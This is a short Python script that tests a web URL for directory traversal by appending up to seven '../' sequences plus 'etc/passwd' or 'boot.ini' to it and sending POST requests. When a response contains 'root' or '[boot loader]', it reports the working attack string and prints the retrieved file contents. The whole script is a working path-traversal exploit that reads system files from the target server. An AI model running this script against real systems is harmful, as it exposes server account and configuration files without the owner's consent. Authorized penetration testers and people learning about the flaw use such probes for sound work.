import requests
import sys

# The URL to be tested is passed as a command line argument
url = sys.argv[1]

# Dictionary containing payloads and the expected string to look for in the response
payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'}

# The string to be used for directory traversal
up = "../"

# Iterate over each payload and the corresponding expected string
for payload, string in payloads.items():
    # Attempt directory traversal up to 7 levels
    for i in range(7):
        # Send a POST request to the constructed URL
        req = requests.post(url + (i * up) + payload)
        # Check if the expected string is in the response
        if string in req.text:
            print("Parameter vulnerable\n")
            print("Attack string: " + (i * up) + payload + "\n")
            print(req.text)
            break

